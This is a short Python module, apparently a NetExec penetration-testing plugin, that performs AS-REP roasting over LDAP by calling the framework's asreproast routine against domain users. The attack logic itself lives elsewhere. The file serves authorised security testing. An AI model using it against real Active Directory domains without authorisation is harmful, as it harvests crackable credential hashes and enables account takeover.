from typing import Dict


class NXCModule:
    """Perform AS-REP roasting via LDAP."""

    name = "asreproast"
    description = "Request AS-REP for accounts without pre-authentication"
    supported_protocols = ["ldap"]
    opsec_safe = True
    multiple_hosts = False

    def options(self, context, module_options: Dict[str, str]):
        """No options available."""

    def on_login(self, context, connection):
        context.log.display("Running AS-REP roasting against domain users")
        connection.asreproast()
